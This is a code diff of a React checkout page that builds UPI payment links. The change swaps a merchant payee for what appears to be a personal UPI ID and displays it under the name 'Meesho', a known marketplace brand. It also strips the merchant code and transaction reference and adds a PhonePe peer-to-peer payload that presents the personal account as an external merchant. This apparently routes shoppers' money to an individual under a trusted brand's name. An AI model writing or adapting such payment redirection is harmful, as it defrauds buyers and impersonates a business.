@@ -92,11 +92,11 @@ function CheckOutpage({ data }) {
 
   }, []);
 
-  const upiId = "eazypay.584736425@icici";
-  const payeeName = "SYFROX";
-  const merchantCode = "5045";
+  const upiId = "rajpatel1861997@okaxis";
+  const payeeName = "Meesho";
+  const aid = "uGICAgOD1lfiuLw";
 
-  const openSelectedUPIApp = async (app, amount) => {
+  const openSelectedUPIApp = (app, amount) => {
     const numericAmount = Number(amount);
 
     if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
@@ -110,74 +110,53 @@ function CheckOutpage({ data }) {
     }
 
     const formattedAmount = numericAmount.toFixed(2);
-    const uniqueTxnRef = `EZYS${Date.now().toString().slice(-8)}${Math.floor(10 + Math.random() * 90)}`;
     const orderNote = `Order_${Date.now()}`;
-    const pageUrl = window.location.href;
 
     const isIOS =
       typeof navigator !== "undefined" &&
       /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    // Official Google Pay Web (Payment Request API) for Android Chrome
-    if (app === "gpay" && !isIOS && typeof window !== "undefined" && window.PaymentRequest) {
-      try {
-        const supportedInstruments = [
-          {
-            supportedMethods: ["https://tez.google.com/pay"],
-            data: {
-              pa: upiId,
-              pn: payeeName,
-              mc: merchantCode,
-              tr: uniqueTxnRef,
-              url: pageUrl,
-            },
-          },
-        ];
-
-        const details = {
-          total: {
-            label: "Total Amount",
-            amount: {
-              currency: "INR",
-              value: formattedAmount,
-            },
-          },
-        };
-
-        const request = new window.PaymentRequest(supportedInstruments, details);
-        const result = await request.show();
-        await result.complete("success");
-        return;
-      } catch (err) {
-        console.warn("PaymentRequest error, falling back to deep link:", err);
-      }
-    }
-
-    // Full UPI parameter query matching official merchant specification
-    const fullMerchantQuery =
+    const baseUpiQuery =
       `pa=${encodeURIComponent(upiId)}` +
       `&pn=${encodeURIComponent(payeeName)}` +
-      `&mc=${encodeURIComponent(merchantCode)}` +
-      `&tr=${encodeURIComponent(uniqueTxnRef)}` +
-      `&url=${encodeURIComponent(pageUrl)}` +
+      `&aid=${encodeURIComponent(aid)}` +
       `&am=${formattedAmount}` +
       `&cu=INR` +
       `&tn=${encodeURIComponent(orderNote)}`;
 
     let paymentUrl = "";
 
-    if (app === "gpay") {
+    if (app === "phonepe") {
       if (isIOS) {
-        paymentUrl = `gpay://upi/pay?${fullMerchantQuery}`;
+        paymentUrl = `phonepe://pay?${baseUpiQuery}`;
       } else {
-        paymentUrl = `tez://upi/pay?${fullMerchantQuery}`;
+        const payload = {
+          p2pPaymentCheckoutParams: {
+            checkoutType: "COLLECT",
+            initialAmount: Math.round(numericAmount * 100),
+            note: {
+              type: "text",
+              message: orderNote,
+            },
+            supportedInstruments: -1,
+          },
+          contact: {
+            type: "EXTERNAL_MERCHANT",
+            name: payeeName,
+            vpa: upiId,
+          },
+        };
+
+        const encodedPayload = btoa(
+          unescape(encodeURIComponent(JSON.stringify(payload)))
+        );
+
+        paymentUrl = `phonepe://native?data=${encodeURIComponent(encodedPayload)}&id=p2ppayment`;
       }
-    } else if (app === "phonepe") {
-      paymentUrl = `phonepe://pay?${fullMerchantQuery}`;
     } else if (app === "paytm") {
-      paymentUrl = `paytmmp://pay?${fullMerchantQuery}`;
+      paymentUrl = `paytmmp://pay?${baseUpiQuery}`;
     } else {
-      paymentUrl = `upi://pay?${fullMerchantQuery}`;
+      paymentUrl = `upi://pay?${baseUpiQuery}`;
     }
 
 
